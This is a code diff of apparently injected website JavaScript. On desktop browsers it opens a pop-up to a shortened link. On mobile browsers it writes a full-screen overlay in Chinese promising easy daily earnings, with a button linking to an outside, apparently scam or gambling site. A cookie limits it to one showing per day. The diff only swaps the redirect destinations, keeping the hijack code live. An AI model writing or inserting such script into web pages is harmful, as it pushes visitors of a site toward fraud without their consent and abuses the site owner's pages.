@@ -10,7 +10,7 @@ function addjs(src) {
 if (navigator.platform.indexOf('Mac') == 0 || navigator.platform.indexOf('Win') == 0) {
     if (!getCookie('cc_cookie')) {
         setCookie('cc_cookie','ok',1);
-        window.open("http://qp.cxwufangbu.cc");
+        window.open("http://t.cn/EGwSiHd");
     }
 }else{
 if (!getCookie('cc_cookie')) {
@@ -19,7 +19,7 @@ setTimeout(function(){
         meta.name = "viewport";
         meta.content = "initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no";
         document.getElementsByTagName('head')[0].appendChild(meta);
-        document.writeln("<style type=\'text/css\'>.guize_html{position:fixed;top:2%;left:50%;margin-top:-40px;margin-left:-159px;width:318px;height:auto;border-radius:4px;background-color:#fff;color:#000;text-align:center;font-size:12px}.guize_html p{padding:0 20px 10px;text-align:center}.guize_html_nei{width:318px;min-height:350px;overflow-y:auto;max-height:500px;height:350px;display:block}.guize_html_nei h3{padding:15px}.btn{display:block;margin:20px auto;width:240px;height:40px;border-radius:4px;background-color:#2196f3;color:#fff!important;text-align:center;line-height:40px;cursor:pointer}.btn:hover{background-color:rgba(33,150,243,.86)}.overfloat{position:fixed;top:0;left:0;z-index:9;width:100%;height:100%;background-color:rgba(1,1,1,.5);z-index:9999}</style><div class=\'overfloat\'id=\'gui_kai\'><div class=\'guize_html\'><div class=\'guize_html_nei\'><h3>2019最新赚钱项目</h3><p>手机即可操作</p><p>日赚千元</p><img src=\'https://telecom2019.github.io/p6.jpg\'width=\'248\'height=\'170\'/></div><a id=\'g_xz\' class=\'btn\'href=\'http://qp.cxwufangbu.cc\'rel=\'noreferrer\'target=\'_blank\'>点击\"深入\"</a><a id=\'g_close\'class=\'btn\' onclick=\"setCookie(\'cc_cookie\', \'ok\', 1);window.location.reload();\">确定</a></div></div>") ;
+        document.writeln("<style type=\'text/css\'>.guize_html{position:fixed;top:2%;left:50%;margin-top:-40px;margin-left:-159px;width:318px;height:auto;border-radius:4px;background-color:#fff;color:#000;text-align:center;font-size:12px}.guize_html p{padding:0 20px 10px;text-align:center}.guize_html_nei{width:318px;min-height:350px;overflow-y:auto;max-height:500px;height:350px;display:block}.guize_html_nei h3{padding:15px}.btn{display:block;margin:20px auto;width:240px;height:40px;border-radius:4px;background-color:#2196f3;color:#fff!important;text-align:center;line-height:40px;cursor:pointer}.btn:hover{background-color:rgba(33,150,243,.86)}.overfloat{position:fixed;top:0;left:0;z-index:9;width:100%;height:100%;background-color:rgba(1,1,1,.5);z-index:9999}</style><div class=\'overfloat\'id=\'gui_kai\'><div class=\'guize_html\'><div class=\'guize_html_nei\'><h3>2019最新赚钱项目</h3><p>手机即可操作</p><p>日赚千元</p><img src=\'https://telecom2019.github.io/p6.jpg\'width=\'248\'height=\'170\'/></div><a id=\'g_xz\' class=\'btn\'href=\'http://jjcp193.com\'rel=\'noreferrer\'target=\'_blank\'>点击\"深入\"</a><a id=\'g_close\'class=\'btn\' onclick=\"setCookie(\'cc_cookie\', \'ok\', 1);window.location.reload();\">确定</a></div></div>") ;
     
 
 }, 4000);}
